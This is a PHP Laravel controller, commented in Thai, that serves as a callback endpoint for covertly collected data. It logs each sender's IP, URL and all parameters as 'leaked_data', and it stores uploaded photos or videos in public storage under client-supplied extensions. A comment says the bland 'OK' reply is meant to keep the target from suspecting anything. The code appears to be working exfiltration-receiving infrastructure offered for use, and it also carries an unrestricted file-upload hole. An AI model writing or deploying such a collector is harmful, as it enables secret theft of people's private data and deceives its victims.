<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\IntelligenceReport;
use Illuminate\Support\Facades\Storage;

class CallbackController extends Controller
{
    public function handleCallback(Request $request)
    {
        $senderIp = $request->ip();
        $filePath = null;
        $fileType = null;
        $fileSize = 0;

        // 1. 🛡️ ตรวจสอบว่ามีการส่งไฟล์ (รูป/วิดีโอ) แนบมาด้วยหรือไม่
        if ($request->hasFile('payload_file')) {
            $file = $request->file('payload_file');

            // ตั้งชื่อไฟล์ตามเวลาและ IP เพื่อความสะดวกในการตรวจสอบ
            $fileName = time() . '_' . $senderIp . '.' . $file->getClientOriginalExtension();

            // เก็บไฟล์ไว้ใน storage/app/public/intelligence (ต้องรัน php artisan storage:link)
            $filePath = $file->storeAs('public/intelligence', $fileName);

            $fileType = $file->getClientOriginalExtension();
            $fileSize = $file->getSize();
        }

        // 2. 📝 รวบรวมข้อมูลทั้งหมด (ทั้ง URL และ Data ที่แฝงมา)
        $capturedData = [
            'url'    => $request->fullUrl(),
            'params' => $request->all(), // เก็บพารามิเตอร์ทั้งหมดที่ส่งมา
            'method' => $request->method()
        ];

        // 3. 💾 บันทึกลงฐานข้อมูลผ่าน Model IntelligenceReport
        IntelligenceReport::create([
            'source_ip'   => $senderIp,
            'leaked_data' => json_encode($capturedData), // เก็บเป็น JSON เพื่อความละเอียด
            'captured_at' => now(),
            'file_path'   => $filePath,
            'file_type'   => $fileType,
            'file_size'   => $fileSize,
        ]);

        // ตอบกลับแบบพรางตัว (เป้าหมายจะได้ไม่สงสัย)
        return response('OK', 200);
    }
}
